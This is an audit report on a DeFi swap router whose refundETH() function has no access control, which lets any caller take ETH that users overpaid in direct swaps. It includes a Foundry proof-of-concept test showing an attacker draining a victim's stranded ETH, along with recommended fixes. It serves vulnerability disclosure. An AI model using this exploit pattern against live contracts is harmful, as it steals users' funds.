Audit Report

## Title
Unguarded `refundETH()` Allows Any Caller to Drain ETH Stranded by Overpaid Direct Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`refundETH()` transfers the router's entire native ETH balance to `msg.sender` with no access control. When a user calls any `payable` swap function directly (not via `multicall`) with `msg.value > amountIn` and `tokenIn == WETH`, `pay()` wraps exactly `amountIn` ETH and leaves the remainder on the router with no automatic refund. A subsequent call to `refundETH()` by any address drains that stranded ETH.

## Finding Description

**Root cause — `pay()` wraps only `amountIn`, leaving excess ETH on the router.**

In `PeripheryPayments.pay()`, when `token == WETH` and `nativeBalance >= value`:

```solidity
uint256 nativeBalance = address(this).balance;   // e.g. 2 ether (msg.value)
if (nativeBalance >= value) {                     // 2 >= 1 → true
    IWETH9(WETH).deposit{value: value}();         // wraps exactly amountIn (1 ether)
    IERC20(WETH).safeTransfer(recipient, value);  // sends 1 WETH to pool
}
// 1 ether remains on the router — no refund
``` [1](#0-0) 

The swap completes successfully. The victim's excess ETH is stranded on the router.

**`exactInputSingle` (and all other swap entry points) are independently callable as `external payable` with any `msg.value`.** [2](#0-1) 

No check enforces `msg.value == amountIn`, and no automatic refund occurs after the swap. [3](#0-2) 

**`refundETH()` has no caller restriction.**

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // sends all ETH to any caller
    }
}
``` [4](#0-3) 

**The `receive()` guard does not help.** It blocks bare ETH pushes from non-WETH addresses, but the victim's ETH enters via `msg.value` on a `payable` function — `receive()` is never invoked. [5](#0-4) 

**The intended safe pattern (multicall + refundETH atomically) is documented but never enforced.** [6](#0-5) [7](#0-6) 

## Impact Explanation

Direct theft of user ETH principal. Any ETH overpaid in a non-multicall swap call is immediately claimable by any address in a subsequent transaction. Loss equals `msg.value − amountIn` per victim transaction. No protocol permission or special role is required by the attacker. This is a Critical/High direct loss of user funds meeting Sherlock thresholds.

## Likelihood Explanation

Users and integrators routinely call swap functions directly with a buffer ETH value to handle slippage or gas estimation uncertainty. MEV bots monitor the mempool for stranded balances on public routers. The attack requires a single public call with no setup and is repeatable for every victim transaction.

## Recommendation

Either:
1. **Auto-refund excess ETH at the end of each payable swap function**: after the swap completes, if `address(this).balance > 0`, transfer it back to `msg.sender`.
2. **Restrict `refundETH()` to only be callable within a `multicall` context** (e.g., via a transient reentrancy flag set by `multicall`), preventing cross-transaction draining.

Option 1 is simpler and eliminates stranding entirely.

## Proof of Concept

```solidity
function test_attacker_steals_victim_overpaid_eth() public {
    address victim   = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactInputSingle directly with 2 ether but amountIn = 1 ether
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // pay() wraps exactly 1 ether; 1 ether remains stranded on router
    assertEq(address(router).balance, 1 ether, "ETH stranded");

    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();  // no access control — attacker receives victim's ETH

    assertEq(attacker.balance - before, 1 ether, "attacker stole victim ETH");
    assertEq(address(router).balance, 0, "router drained");
}
```

`refundETH()` then sends the full balance to the attacker with no origin check. [4](#0-3)
